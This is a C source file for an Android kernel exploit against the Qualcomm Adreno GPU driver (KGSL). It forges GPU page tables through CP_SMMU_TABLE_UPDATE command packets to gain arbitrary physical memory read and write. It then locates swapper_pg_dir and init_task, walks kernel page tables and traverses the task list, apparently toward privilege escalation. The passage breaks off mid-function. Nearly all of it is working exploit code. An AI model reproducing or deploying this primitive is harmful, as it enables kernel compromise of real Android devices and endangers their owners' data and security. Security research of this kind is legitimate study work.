#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO

#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include "adrenaline.h"
#include <string.h>
#include <stdbool.h>
#include <sys/wait.h>
#include <sys/capability.h>
#include <setjmp.h>

const uint64_t kFakeGpuAddr = 0x40403000;

static int setup_pagetables(uint8_t *tt0, uint32_t pages, uint32_t tt0phys, uint64_t fake_gpuaddr, uint64_t target_pa);
static void sync_cache_to_gpu(void* start, void* end);
static void sync_cache_from_gpu(void* start, void* end);
static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_gpuaddr, uint64_t phyaddr, uint64_t completion_marker_write_addr, bool write, uint64_t write_addr, uint32_t count, uint32_t* values);
static int DoReadContiguous(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_gpuaddr, uint64_t phyaddr, uint64_t completion_marker_write_addr, uint64_t read_addr, uint32_t dword_count);


struct cheese_gpu_rw {
    int fd;
    uint32_t ctx_id;

    uint32_t* payload_buf;
    uint64_t payload_gpuaddr;
    uint32_t* output_buf;
    uint64_t output_gpuaddr;

    void* target_physical_page;

    uint64_t phyaddr;

    void* garbage;
    uint64_t swapper_pg_dir_phys; // Added for stabilization
    uint64_t init_task_phys;      // Added for stabilization
};

#define KGSL_MEMFLAGS_IOCOHERENT 0x80000000ULL

// from adrenaline.cpp:
// https://googleprojectzero.blogspot.com/2020/09/attacking-qualcomm-adreno-gpu.html

/* modified version of kilroy's kgsl_ctx_create. create a KGSL context that will use
 * ringbuffer 0, and make sure KGSL_CONTEXT_USER_GENERATED_TS is disabled */
int kgsl_ctx_create0(int fd, uint32_t *ctx_id) {
    struct kgsl_drawctxt_create req = {
            .flags = 0x00001812, // low prio, rb 0
    };
    int ret;

    ret = ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &req);
    if (ret)
        return ret;

    *ctx_id = req.drawctxt_id;

    return 0;
}

/* cleanup an existing GPU context */
int kgsl_ctx_destroy(int fd, uint32_t ctx_id) {
    struct kgsl_drawctxt_destroy req = {
            .drawctxt_id = ctx_id,
    };

    return ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &req);
}

#define KGSL_MEMFLAGS_GPUREADONLY 0x01000000U

/* modified version of kilroy's kgsl_map. the choice to use KGSL_MEMFLAGS_USE_CPU_MAP
 * comes from earlier debugging efforts, but a normal user mapping should work as well,
 * it would just need to use uint64_t and drop the flags. */
// https://github.com/github/securitylab/blob/105618fc1fa83c08f4446749e64310b539cb0262/SecurityExploits/Android/Qualcomm/CVE_2022_25664/adreno_kernel/kgsl_utils.c#L59
int kgsl_map(int fd, unsigned long addr, size_t len, uint64_t *gpuaddr) {
    struct kgsl_map_user_mem req = {
            .len = len,
            .offset = 0,
            .hostptr = addr,
            .memtype = KGSL_USER_MEM_TYPE_ADDR,
            // .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
    };
    int ret;

    ret = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &req);
    if (ret)
        return ret;

    *gpuaddr = req.gpuaddr;

    return 0;
}

// Page table constants for PTE calculation
#define PAGE_SHIFT 12
#define LEVEL_COUNT 4  // 4-level page table

// Helper function to compute page table index for a given address and level
static inline uint64_t compute_pt_index(uint64_t addr, int level) {
    uint64_t vpfn = addr >> PAGE_SHIFT;
    vpfn >>= (3 - level) * 9;
    return vpfn & 0x1FF;  // 9 bits for the index
}

// Kernel structure offsets
#define OFFSETOF_TASK_STRUCT_MM 0x518
#define OFFSETOF_MM_PGD 0x48

// Forward declarations
static int ReadPhys64(struct cheese_gpu_rw* cheese, uint64_t phys_addr, uint64_t* out_val);
static uint64_t walk_page_table_for_pte(struct cheese_gpu_rw* cheese, uint64_t pgd_phys_addr, uint64_t virtual_addr);
static int dirty_flag_exploit(struct cheese_gpu_rw* ctx, uint64_t tsk);
static uint64_t get_mm_struct_from_task(struct cheese_gpu_rw* cheese, uint64_t task_struct_addr);
uint64_t kernel_pread_u64(struct cheese_gpu_rw* cheese, uint64_t paddr);
void kernel_pwrite_u64(struct cheese_gpu_rw* cheese, uint64_t paddr, uint64_t val);
uint64_t kernel_va_to_pa(struct cheese_gpu_rw* cheese, uint64_t kva);

const uint64_t kGarbageSize = 16 * 1024 * 1024;

// Complete function to walk the page table and find the final PTE that maps a virtual address
static int ReadPhys64(struct cheese_gpu_rw* cheese, uint64_t phys_addr, uint64_t* out_val) {
    uint32_t low, high;

    if (setup_pagetables(cheese->target_physical_page, 1, cheese->phyaddr, kFakeGpuAddr, phys_addr & ~0xfffull)) {
        return 1;
    }
    sync_cache_to_gpu(cheese->target_physical_page, cheese->target_physical_page + 0x1000);

    // Read low 32 bits
    if (DoWrite(cheese->fd, cheese->ctx_id, cheese->payload_buf, cheese->payload_gpuaddr, 
                cheese->phyaddr, kFakeGpuAddr + 0x1100, /*write=*/false, 
                kFakeGpuAddr + (phys_addr & 0xfffull), 1, NULL)) {
        return 1;
    }
    sleep(1);
    sync_cache_from_gpu(cheese->target_physical_page, cheese->target_physical_page + 0x1000);
    volatile uint32_t* result_marker = cheese->target_physical_page + 0x100;
    if (result_marker[0] != 0x41414141) {
        return 1;
    }
    low = *(volatile uint32_t*)(cheese->target_physical_page + 0x104);
    result_marker[0] = 0;
    sync_cache_to_gpu((void*)result_marker, (void*)(result_marker+1));

    // Read high 32 bits
    uint64_t high_addr = phys_addr + 4;
    if ((high_addr & ~0xfffull) != (phys_addr & ~0xfffull)) {
        if (setup_pagetables(cheese->target_physical_page, 1, cheese->phyaddr, kFakeGpuAddr, high_addr & ~0xfffull)) {
            return 1;
        }
        sync_cache_to_gpu(cheese->target_physical_page, cheese->target_physical_page + 0x1000);
    }

    if (DoWrite(cheese->fd, cheese->ctx_id, cheese->payload_buf, cheese->payload_gpuaddr, 
                cheese->phyaddr, kFakeGpuAddr + 0x1100, /*write=*/false, 
                kFakeGpuAddr + (high_addr & 0xfffull), 1, NULL)) {
        return 1;
    }
    sleep(1);
    sync_cache_from_gpu(cheese->target_physical_page, cheese->target_physical_page + 0x1000);
    if (result_marker[0] != 0x41414141) {
        return 1;
    }
    high = *(volatile uint32_t*)(cheese->target_physical_page + 0x104);

    *out_val = ((uint64_t)high << 32) | low;
    return 0;
}

// Function to properly walk page tables for 39-bit virtual addresses (typical on Android)
static uint64_t walk_page_table_for_pte(struct cheese_gpu_rw* cheese, uint64_t pgd_phys_addr, uint64_t virtual_addr) {
    // For 39-bit VA: 3-level page table
    // Level 1 (PGD): bits [38:30] - 9 bits, 512 entries
    uint64_t pgd_index = (virtual_addr >> 30) & 0x1FF;
    uint64_t pgd_entry_addr = pgd_phys_addr + (pgd_index * sizeof(uint64_t));
    
    fprintf(stderr, "walk_page_table: VA=0x%lx, PGD index=%lu, PGD entry addr=0x%lx\n", 
            virtual_addr, pgd_index, pgd_entry_addr);
    
    uint64_t pgd_entry_val;
    if (ReadPhys64(cheese, pgd_entry_addr, &pgd_entry_val)) {
        fprintf(stderr, "walk_page_table: Failed to read PGD entry\n");
        return 0;
    }
    
    fprintf(stderr, "walk_page_table: PGD entry value=0x%lx\n", pgd_entry_val);
    
    // Check if entry is valid - bits [1:0] should be 0x3 for table descriptor
    if ((pgd_entry_val & 0x3) != 0x3) {
        fprintf(stderr, "walk_page_table: Invalid PGD entry (bits[1:0]=0x%lx, expected 0x3)\n", 
                pgd_entry_val & 0x3);
        return 0;
    }
    
    // Extract PMD table address - bits [47:12]
    uint64_t pmd_addr = pgd_entry_val & 0x0000FFFFFFFFF000ULL;
    if (!pmd_addr) {
        fprintf(stderr, "walk_page_table: Null PMD address\n");
        return 0;
    }
    
    // Level 2 (PMD): bits [29:21] - 9 bits
    uint64_t pmd_index = (virtual_addr >> 21) & 0x1FF;
    uint64_t pmd_entry_addr = pmd_addr + (pmd_index * sizeof(uint64_t));
    
    fprintf(stderr, "walk_page_table: PMD addr=0x%lx, PMD index=%lu, PMD entry addr=0x%lx\n",
            pmd_addr, pmd_index, pmd_entry_addr);
    
    uint64_t pmd_entry_val;
    if (ReadPhys64(cheese, pmd_entry_addr, &pmd_entry_val)) {
        fprintf(stderr, "walk_page_table: Failed to read PMD entry\n");
        return 0;
    }
    
    fprintf(stderr, "walk_page_table: PMD entry value=0x%lx\n", pmd_entry_val);
    
    // Check if it's a valid entry
    if ((pmd_entry_val & 0x1) == 0) {
        fprintf(stderr, "walk_page_table: Invalid PMD entry (bit 0 not set)\n");
        return 0;
    }
    
    // Check if it's a block mapping (2MB page) - bit[1] = 0 means block
    if ((pmd_entry_val & 0x3) == 0x1) {
        fprintf(stderr, "walk_page_table: PMD is a block descriptor (2MB page) - cannot get PTE\n");
        return 0;
    }
    
    // It's a table descriptor - extract PTE table address
    uint64_t pte_addr = pmd_entry_val & 0x0000FFFFFFFFF000ULL;
    if (!pte_addr) {
        fprintf(stderr, "walk_page_table: Null PTE address\n");
        return 0;
    }
    
    // Level 3 (PTE): bits [20:12] - 9 bits
    uint64_t pte_index = (virtual_addr >> 12) & 0x1FF;
    uint64_t target_pte_addr = pte_addr + (pte_index * sizeof(uint64_t));
    
    fprintf(stderr, "walk_page_table: PTE addr=0x%lx, PTE index=%lu, target PTE addr=0x%lx\n",
            pte_addr, pte_index, target_pte_addr);
    
    return target_pte_addr;
}

/* send pad IBs and a payload IB at a specific index to the GPU */
int kgsl_gpu_command_payload(int fd, uint32_t ctx_id, uint64_t gpuaddr, uint32_t cmdsize, uint32_t n, uint32_t target_idx, uint64_t target_cmd, uint32_t target_size) {
    struct kgsl_command_object *cmds;

    struct kgsl_gpu_command req = {
            .context_id = ctx_id,
            .cmdsize = sizeof(struct kgsl_command_object),
            .numcmds = n,
    };
    size_t cmds_size;
    uint32_t i;

    cmds_size = n * sizeof(struct kgsl_command_object);

    cmds = (struct kgsl_command_object *) malloc(cmds_size);

    if (cmds == NULL) {
        return -1;
    }

    memset(cmds, 0, cmds_size);

    for (i = 0; i < n; i++) {
        cmds[i].flags = KGSL_CMDLIST_IB;

        if (i == target_idx) {
            cmds[i].gpuaddr = target_cmd;
            cmds[i].size = target_size;
        }
        else {
            cmds[i].gpuaddr = gpuaddr + (i << 16);
            cmds[i].size = cmdsize;
        }
    }

    req.cmdlist = (unsigned long) cmds;

    int err = ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &req);

    free(cmds);
    return err;
}

#define NPBUFS 256

#define LEVEL1_SHIFT    30
#define LEVEL1_MASK     (0x1fful << LEVEL1_SHIFT)

#define LEVEL2_SHIFT    21
#define LEVEL2_MASK     (0x1ff << LEVEL2_SHIFT)

#define LEVEL3_SHIFT    12
#define LEVEL3_MASK     (0x1ff << LEVEL3_SHIFT)

#define ENTRY_VALID     3
#define ENTRY_RW        (1 << 6)

/* Normal Non-Cacheable memory */
#define ENTRY_MEMTYPE_NNC   (3 << 2)

/* outer attributes */
#define ENTRY_OUTER_SHARE (2 << 8)

/* Active */
#define ENTRY_AF (1<<10)

/* Non-Global */
#define ENTRY_NG (1<<11)

int setup_pagetables(uint8_t *tt0, uint32_t pages, uint32_t tt0phys, uint64_t fake_gpuaddr, uint64_t target_pa) {
    uint64_t *level_base;
    uint64_t level1_index, level2_index, level3_index;
    int i;

    for (i = 0; i < pages; i++) {
        level_base = (uint64_t *) (tt0 + (i * PAGE_SIZE));

        memset(level_base, 0x45, 4096);

        level1_index = (fake_gpuaddr & LEVEL1_MASK) >> LEVEL1_SHIFT;
        level2_index = (fake_gpuaddr & LEVEL2_MASK) >> LEVEL2_SHIFT;
        level3_index = (fake_gpuaddr & LEVEL3_MASK) >> LEVEL3_SHIFT;

        if (level1_index == level2_index || level1_index == level3_index ||
            level2_index == level3_index) {
            return -1;
        }

        level_base[level1_index] = (uint64_t) tt0phys | ENTRY_VALID;
        level_base[level2_index] = (uint64_t) tt0phys | ENTRY_VALID;
        level_base[level3_index] = (uint64_t) (target_pa | ENTRY_VALID | ENTRY_RW |
                                               ENTRY_MEMTYPE_NNC | ENTRY_OUTER_SHARE | ENTRY_AF |
                                               ENTRY_NG);
        level_base[level3_index + 1] = (uint64_t) (tt0phys | ENTRY_VALID | ENTRY_RW |
                                                ENTRY_MEMTYPE_NNC | ENTRY_OUTER_SHARE | ENTRY_AF |
                                                ENTRY_NG);
        for (int i = 0; i < 16; i++) {
            int index = level3_index + 2 + i;
            if (index == level1_index || index == level2_index || index == level3_index) {
                return -1;
            }
            level_base[index] = (uint64_t) (target_pa + (i*0x1000) | ENTRY_VALID | ENTRY_RW |
                ENTRY_MEMTYPE_NNC | ENTRY_OUTER_SHARE | ENTRY_AF |
                ENTRY_NG);
        }
    }

    return 0;
}

// From Mesa/Freedreno/Turnip

static inline void
tu_sync_cacheline_to_gpu(void const *p __attribute__((unused)))
{
   __asm volatile("dc cvac, %0" : : "r" (p) : "memory");
}

static inline void
tu_sync_cacheline_from_gpu(void const *p __attribute__((unused)))
{
   __asm volatile("dc civac, %0" : : "r" (p) : "memory");
}

uint32_t
tu_get_l1_dcache_size()
{
   uint64_t ctr_el0;
   __asm__ volatile("mrs\t%x0, ctr_el0" : "=r"(ctr_el0));
   return 4 << ((ctr_el0 >> 16) & 0xf);
}

static uint64_t g_level1_dcache_size;

static void sync_cache_to_gpu(void* start, void* end) {
    start = (char *) ((uintptr_t) start & ~(g_level1_dcache_size - 1));
    for (; start < end; start += g_level1_dcache_size) {
        tu_sync_cacheline_to_gpu(start);
    }
}

static void sync_cache_from_gpu(void* start, void* end) {
    start = (char *) ((uintptr_t) start & ~(g_level1_dcache_size - 1));
    for (; start < end; start += g_level1_dcache_size) {
        tu_sync_cacheline_from_gpu(start);
    }
}

#define CP_WAIT_MEM_WRITES 0x12
#define CP_SET_DRAW_STATE 0x43
#define CP_SET_MODE 0x63
#define CP_INDIRECT_BUFFER 0x3f
#define DRAW_STATE_MODE_BINNING 0x1
#define DRAW_STATE_MODE_GMEM 0x2
#define DRAW_STATE_MODE_BYPASS 0x4
#define DRAW_STATE_DIRTY (1 << 16)
#define CP_SMMU_TABLE_UPDATE 0x53
#define CP_CONTEXT_SWITCH_YIELD 0x6b

#define CP_MEMCPY 0x75

static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_gpuaddr, uint64_t phyaddr, uint64_t completion_marker_write_addr, bool write, uint64_t write_addr, uint32_t count, uint32_t* values) {
    uint32_t* drawstate_buf = payload_buf + 0x100;
    uint64_t drawstate_gpuaddr = payload_gpuaddr + 0x100*sizeof(uint32_t);
    uint32_t* drawstate_cmds = drawstate_buf;
    *drawstate_cmds++ = cp_type7_packet(CP_SMMU_TABLE_UPDATE, 4);
    drawstate_cmds += cp_gpuaddr(drawstate_cmds, phyaddr);
    *drawstate_cmds++ = 0;
    *drawstate_cmds++ = 0;
    drawstate_cmds += cp_wait_for_me(drawstate_cmds);
    drawstate_cmds += cp_wait_for_idle(drawstate_cmds);
    
    if (write) {
        *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 2 + count);
        drawstate_cmds += cp_gpuaddr(drawstate_cmds, write_addr);
        for (int i = 0; i < count; i++) {
            *drawstate_cmds++ = values[i];
        }
    } else {
        if (count > 1) {
            for (int i = 0; i < count; i++) {
                *drawstate_cmds++ = cp_type7_packet(CP_MEMCPY, 5);
                *drawstate_cmds++ = 1;
                drawstate_cmds += cp_gpuaddr(drawstate_cmds, write_addr + i*0x1000);
                drawstate_cmds += cp_gpuaddr(drawstate_cmds, completion_marker_write_addr + 4 + i*4);
            }
        } else {
            *drawstate_cmds++ = cp_type7_packet(CP_MEMCPY, 5);
            *drawstate_cmds++ = count;
            drawstate_cmds += cp_gpuaddr(drawstate_cmds, write_addr);
            drawstate_cmds += cp_gpuaddr(drawstate_cmds, completion_marker_write_addr + 4);
        }
    }
    *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
    drawstate_cmds += cp_gpuaddr(drawstate_cmds, completion_marker_write_addr);
    *drawstate_cmds++ = 0x41414141;

    uint32_t* payload_cmds = payload_buf;
    *payload_cmds++ = cp_type7_packet(CP_SET_MODE, 1);
    *payload_cmds++ = 1;
    *payload_cmds++ = cp_type7_packet(CP_SET_DRAW_STATE, 3);
    *payload_cmds++ = (drawstate_cmds - drawstate_buf) | ((DRAW_STATE_MODE_BINNING | DRAW_STATE_MODE_GMEM | DRAW_STATE_MODE_BYPASS) << 20);
    payload_cmds += cp_gpuaddr(payload_cmds, drawstate_gpuaddr);

    uint32_t cmd_size = (payload_cmds - payload_buf) * sizeof(uint32_t);

    sync_cache_to_gpu((void*)payload_buf, ((void*)payload_buf) + 0x1000);
    int err = kgsl_gpu_command_payload(fd, ctx_id, 0, 0, 1, 0, payload_gpuaddr, cmd_size);
    if (err) {
        return 1;
    }
    return 0;
}

const uint64_t gPhyAddrs[] = {0xfebeb000, 0xd0b3b000, 0xbe690000, 0xd5cf0000};

int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
    uint64_t kernel_physical_memory_region = 0xA8000000;
    uint64_t kernel_read_offset = 0x4;
    uint64_t target_read_physical_address = kernel_physical_memory_region + kernel_read_offset;

    uint64_t phyaddr = 0xfebeb000;
    if (getenv("CHEESE_PHYADDR")) {
        phyaddr = strtoull(getenv("CHEESE_PHYADDR"), NULL, 0);
    } else if (getenv("CHEESE_ATTEMPT")) {
        phyaddr = gPhyAddrs[atoi(getenv("CHEESE_ATTEMPT"))];
    }

    uint64_t pbuf_len = PAGE_SIZE * 4096;
    uint8_t *pbufs[NPBUFS];

    for (int i = 0; i < NPBUFS; i++) {
        uint8_t * pbuf = (uint8_t *) mmap(NULL, pbuf_len, PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);

        if (pbuf == (uint8_t *) MAP_FAILED) {
            fprintf(stderr, "pbuf mmap failed (%d)\n", i);
            return 1;
        }

        int ret = setup_pagetables(pbuf, pbuf_len/4096, phyaddr, kFakeGpuAddr, target_read_physical_address & ~0xfffull);

        if (ret == -1) {
            fprintf(stderr, "setup_pagetables failed\n");
            return 1;
        }

        pbufs[i] = pbuf;
        sync_cache_to_gpu((void*)pbuf, ((void*)pbuf) + pbuf_len);
    }

    int fd = open("/dev/kgsl-3d0", O_RDWR|O_CLOEXEC);
    if (fd == -1) {
        fprintf(stderr, "Can't open kgsl\n");
        return 1;
    }

    uint32_t ctx_id;

    int err = kgsl_ctx_create0(fd, &ctx_id);
    if (err) {
        fprintf(stderr, "Can't create context: %s\n", strerror(err));
        return 1;
    }

    uint32_t* payload_buf = mmap(NULL, PAGE_SIZE,
                                        PROT_READ|PROT_WRITE,
                                        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (payload_buf == MAP_FAILED) {
        fprintf(stderr, "Can't map buf: %s\n", strerror(errno));
        return 1;
    }

    uint64_t payload_gpuaddr;

    err = kgsl_map(fd, (unsigned long)payload_buf, PAGE_SIZE, &payload_gpuaddr);
    if (err) {
        fprintf(stderr, "Can't map to gpu: %s\n", strerror(err));
        return 1;
    }

    uint32_t* output_buf = (uint32_t *) mmap(NULL, PAGE_SIZE,
        PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

    uint64_t output_gpuaddr;
    err = kgsl_map(fd, (unsigned long)output_buf, PAGE_SIZE, &output_gpuaddr);
    if (err) {
        fprintf(stderr, "Can't map to gpu: %s\n", strerror(err));
        return 1;
    }

    if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100, false, kFakeGpuAddr + (target_read_physical_address & 0xfffull), 1, NULL)) {
        fprintf(stderr, "Can't do first read\n");
    }
    sleep(1);

    void* target_physical_page = NULL;
    int target_pbuf = -1;

    for (int i = 0; i < NPBUFS; i++) {
        void* pbuf = pbufs[i];
        for (int off = 0; off < pbuf_len; off += 4096) {
            void* page_start = pbuf + off;
            sync_cache_from_gpu((void*)page_start, ((void*)page_start) + 0x1000);
            uint32_t* target = page_start + 0x100;
            if (target[0] == 0x41414141) {
                fprintf(stderr, "found it: virt addr = %p\n", page_start);
                target_physical_page = page_start;
                target_pbuf = i;
            }
        }
    }

    if (target_pbuf == -1) {
        fprintf(stderr, "can't find target\n");
        return 1;
    }

    uint32_t read_output = *(uint32_t*)(target_physical_page + 0x104);
    fprintf(stderr, "read output: %x\n", read_output);

    if (read_output == 0) {
        fprintf(stderr, "can't find kernel entry at %lx\n", target_read_physical_address);
        return 1;
    }

    uint32_t branch_off = read_output & ((1 << 26) - 1);
    uint64_t kernel_entry_file_off = kernel_read_offset + (branch_off << 2);
    fprintf(stderr, "kernel entry = %lx\n", kernel_physical_memory_region + kernel_entry_file_off);

    uint64_t swapper_pg_dir_off = 0;
    if (getenv("CHEESE_SWAPPER_PG_DIR_OFF")) {
        swapper_pg_dir_off = strtoull(getenv("CHEESE_SWAPPER_PG_DIR_OFF"), NULL, 0);
    } else {
        target_read_physical_address = kernel_physical_memory_region + kernel_entry_file_off - 0xf000 - 0x6000 + 2*sizeof(uint64_t);
        fprintf(stderr, "target_read_physical_address = %lx\n", target_read_physical_address);
        if (setup_pagetables(target_physical_page, 1,
        phyaddr, kFakeGpuAddr, target_read_physical_address & ~0xfffull)) {
            return 1;
        }
        sync_cache_to_gpu(target_physical_page, target_physical_page + 0x1000);
        if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100, false, kFakeGpuAddr + 0x2000 + (target_read_physical_address & 0xfffull), 16, NULL)) {
            fprintf(stderr, "Can't do second read\n");
            return 1;
        }
        fprintf(stderr, "CP_MEMCPY read for swapper_pg_dir successful.\n");
        sleep(1);
        sync_cache_from_gpu(target_physical_page, target_physical_page + 0x1000);
        uint32_t second_read_sentinel = *(uint32_t*)(target_physical_page + 0x100);
        fprintf(stderr, "second read sentinel: %x\n", second_read_sentinel);
        if (second_read_sentinel != 0x41414141) {
            fprintf(stderr, "Fail\n");
            return 1;
        }

        for (int i = 15; i >= 0; i--) {
            read_output = *(uint32_t*)(target_physical_page + 0x104 + i*4);
            fprintf(stderr, "second read value: %x\n", read_output);
            if (read_output == 0x45454545) {
                fprintf(stderr, "Fail\n");
                return 1;
            }
            if ((read_output & 0xfff) == 0x3) {
                uint64_t idmap_pg_dir_off = kernel_entry_file_off - 0xf000 - 0x6000 + i*0x1000;
                swapper_pg_dir_off = idmap_pg_dir_off + 0x5000;
                fprintf(stderr, "found CHEESE_SWAPPER_PG_DIR_OFF=0x%lx\n", swapper_pg_dir_off);

                uint64_t init_task_off = idmap_pg_dir_off + 0x321F80;
                cheese->init_task_phys = kernel_physical_memory_region + init_task_off;
                fprintf(stderr, "Found init_task_phys: %#lx\n", cheese->init_task_phys);

                break;
            }
        }
        if (!swapper_pg_dir_off) {
            fprintf(stderr, "can't find swapper_pg_dir\n");
            return 1;
        }
        sleep(1);
    }

    uint64_t swapper_pg_dir_phys = kernel_physical_memory_region + swapper_pg_dir_off;
    cheese->swapper_pg_dir_phys = swapper_pg_dir_phys;
    fprintf(stderr, "Found swapper_pg_dir_phys: %#lx\n", swapper_pg_dir_phys);

    cheese->fd = fd;
    cheese->ctx_id = ctx_id;
    cheese->payload_buf = payload_buf;
    cheese->payload_gpuaddr = payload_gpuaddr;
    cheese->output_buf = output_buf;
    cheese->output_gpuaddr = output_gpuaddr;
    cheese->target_physical_page = target_physical_page;
    cheese->phyaddr = phyaddr;

    // Don't unmap the buffer containing target_physical_page
    for (int i = 0; i < NPBUFS; i++) {
        if (i != target_pbuf) {  // Skip the buffer we're using
            munmap(pbufs[i], pbuf_len);
            pbufs[i] = NULL;
        }
    }
    return 0;
}

int cheese_shutdown(struct cheese_gpu_rw* cheese) {
    int err = kgsl_ctx_destroy(cheese->fd, cheese->ctx_id);
    if (err) {
        fprintf(stderr, "Can't destroy context: %s\n", strerror(err));
        return 1;
    }

    close(cheese->fd);
    return 0;
}

static uint64_t get_pgd_from_mm(struct cheese_gpu_rw* cheese, uint64_t mm_struct_pa) {
    uint64_t pgd_ptr_phys_addr = mm_struct_pa + OFFSETOF_MM_PGD;
    uint64_t pgd_va = 0;

    if (ReadPhys64(cheese, pgd_ptr_phys_addr, &pgd_va)) {
        fprintf(stderr, "get_pgd_from_mm: Failed to read pgd field from mm_struct\n");
        return 0;
    }

    if (pgd_va == 0) {
        fprintf(stderr, "get_pgd_from_mm: pgd VA is null\n");
        return 0;
    }

    fprintf(stderr, "Found PGD at virtual address: 0x%lx\n", pgd_va);

    uint64_t pgd_pa = kernel_va_to_pa(cheese, pgd_va);
    if (pgd_pa == 0) {
        fprintf(stderr, "get_pgd_from_mm: failed to convert PGD VA to PA\n");
        return 0;
    }

    fprintf(stderr, "Converted PGD VA to PA: 0x%lx\n", pgd_pa);
    return pgd_pa;
}

static uint64_t get_mm_struct_from_task(struct cheese_gpu_rw* cheese, uint64_t task_struct_addr) {
    uint64_t mm_field_addr = task_struct_addr + OFFSETOF_TASK_STRUCT_MM;
    uint64_t mm_struct_addr = 0;
    
    if (ReadPhys64(cheese, mm_field_addr, &mm_struct_addr)) {
        fprintf(stderr, "get_mm_struct_from_task: Failed to read mm field from task_struct\n");
        return 0;
    }
    
    fprintf(stderr, "Found mm_struct at virtual address: 0x%lx\n", mm_struct_addr);
    return mm_struct_addr;
}

// ------------------- Start of stabilization code -------------------

uint64_t kernel_pread_u64(struct cheese_gpu_rw* cheese, uint64_t paddr) {
    uint64_t val = 0;
    if (ReadPhys64(cheese, paddr, &val)) {
        fprintf(stderr, "kernel_pread_u64 failed for addr %lx\n", paddr);
        return 0;
    }
    return val;
}

void kernel_pwrite_u64(struct cheese_gpu_rw* cheese, uint64_t paddr, uint64_t val) {
    uint32_t values[2];
    values[0] = val & 0xFFFFFFFF;
    values[1] = (val >> 32) & 0xFFFFFFFF;

    if (setup_pagetables(cheese->target_physical_page, 1, cheese->phyaddr, kFakeGpuAddr, paddr & ~0xfffull)) {
        fprintf(stderr, "kernel_pwrite_u64: setup_pagetables failed for addr %lx\n", paddr);
        return;
    }
    sync_cache_to_gpu(cheese->target_physical_page, cheese->target_physical_page + 0x1000);

    if (DoWrite(cheese->fd, cheese->ctx_id, cheese->payload_buf, cheese->payload_gpuaddr,
                cheese->phyaddr, kFakeGpuAddr + 0x1100, true,
                kFakeGpuAddr + (paddr & 0xfffull), 2, values)) {
        fprintf(stderr, "kernel_pwrite_u64: DoWrite failed for addr %lx\n", paddr);
        return;
    }
    sleep(1);
    sync_cache_from_gpu(cheese->target_physical_page, cheese->target_physical_page + 0x1000);
    volatile uint32_t* result_marker = cheese->target_physical_page + 0x100;
    if (result_marker[0] != 0x41414141) {
        fprintf(stderr, "kernel_pwrite_u64: marker not set (0x%x)\n", result_marker[0]);
    }
    result_marker[0] = 0;
    sync_cache_to_gpu((void*)result_marker, (void*)(result_marker+1));
}

// Add validation for 39-bit VA space
static inline bool is_valid_39bit_va(uint64_t va) {
    // For 39-bit VA:
    // User space: 0x0000000000000000 - 0x0000007FFFFFFFFF
    // Kernel space: 0xFFFFFF8000000000 - 0xFFFFFFFFFFFFFFFF
    
    if (va <= 0x0000007FFFFFFFFFULL) {
        return true;  // User space
    }
    
    if (va >= 0xFFFFFF8000000000ULL) {
        return true;  // Kernel space
    }
    
    return false;  // Invalid address in the "hole"
}

uint64_t kernel_va_to_pa(struct cheese_gpu_rw* cheese, uint64_t kva) {
    if (!is_valid_39bit_va(kva)) {
        fprintf(stderr, "kernel_va_to_pa: Invalid 39-bit VA: 0x%lx\n", kva);
        return 0;
    }
    
    // Always use page table walk with swapper_pg_dir
    if (cheese->swapper_pg_dir_phys == 0) {
        fprintf(stderr, "kernel_va_to_pa: swapper_pg_dir_phys not set\n");
        return 0;
    }
    
    uint64_t pte_paddr = walk_page_table_for_pte(cheese, cheese->swapper_pg_dir_phys, kva);
    if (!pte_paddr) {
        fprintf(stderr, "kernel_va_to_pa: walk_page_table_for_pte failed for kva 0x%lx\n", kva);
        return 0;
    }
    
    uint64_t pte_val = kernel_pread_u64(cheese, pte_paddr);
    if (!pte_val || (pte_val & 0x1) == 0) {
        fprintf(stderr, "kernel_va_to_pa: Invalid PTE value 0x%lx at addr 0x%lx\n", pte_val, pte_paddr);
        return 0;
    }
    
    // Extract physical address from PTE
    uint64_t pa = (pte_val & 0x0000FFFFFFFFF000ULL) | (kva & 0xFFFULL);
    
    fprintf(stderr, "kernel_va_to_pa: Page table walk: KVA 0x%lx -> PA 0x%lx (PTE=0x%lx)\n", 
            kva, pa, pte_val);
    
    return pa;
}

uint64_t get_curr_task_struct(struct cheese_gpu_rw* cheese) {
    fprintf(stderr, "get_curr_task_struct: Called with cheese: %p, init_task_phys: 0x%lx\n", cheese, cheese->init_task_phys);

    if (cheese->init_task_phys == 0) {
        fprintf(stderr, "get_curr_task_struct: cheese->init_task_phys is 0, cannot traverse task list\n");
        return 0;
    }

    uint64_t init_task_tasks_phys = cheese->init_task_phys + 0x4c8;
    uint64_t current_tasks_member_phys = init_task_tasks_phys;

    int64_t kernel_offset = 0;
    bool kernel_offset_calculated = false;
    int count = 0;

    fprintf(stderr, "Starting task list backward traversal from init_task_phys: 0x%lx\n", cheese->init_task_phys);

    do {
        uint64_t current_task_phys = current_tasks_member_phys - 0x4c8;
        fprintf(stderr, "get_curr_task_struct: Processing task at phys addr: 0x%lx (iteration %d)\n", current_task_phys, count);

        // Read PID (pid is at offset 0x5c8, but it's a 32-bit value, not 64-bit)
        uint64_t pid_addr = current_task_phys + 0x5c8;
        uint64_t pid_64 = 0;
        if (!ReadPhys64(cheese, pid_addr, &pid_64)) {
